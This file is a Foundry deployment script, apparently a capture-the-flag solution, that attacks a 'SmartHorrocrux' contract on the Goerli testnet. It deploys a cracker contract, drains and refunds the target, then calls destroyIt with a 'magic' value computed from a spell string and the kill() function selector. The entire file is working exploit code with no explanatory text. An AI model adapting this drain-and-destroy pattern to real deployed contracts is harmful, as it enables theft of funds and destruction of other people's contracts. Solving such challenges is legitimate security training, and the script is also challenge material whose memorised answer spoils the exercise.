
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Script.sol";
import "forge-std/console2.sol";

import "./SmartHorrocrux.sol";
import "./SmartHorrocruxCracker.sol";

/// @dev forge script script/Attack.s.sol:Attack --rpc-url $ETH_GOERLI_RPC_URL --broadcast

contract Attack is Script {
  
  function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");

        vm.startBroadcast(deployerPrivateKey);
        SmartHorrocruxCracker cracker = new SmartHorrocruxCracker{value: 1}(0x937Ed8C743f988C584a67F08D54e63387477444F);
        SmartHorrocrux horrocrux = SmartHorrocrux(0x937Ed8C743f988C584a67F08D54e63387477444F);
        
        cracker.drain();
        cracker.fund();

        string memory spell = "EtherKadabra";

        horrocrux.setInvincible();

        // kill() selector is 0x41c0e1b5
        uint256 magic = uint256(bytes32(bytes(spell))) - uint256(bytes32(bytes4(SmartHorrocrux.kill.selector)));
        horrocrux.destroyIt(spell, magic);

        vm.stopBroadcast();
  }
   
}
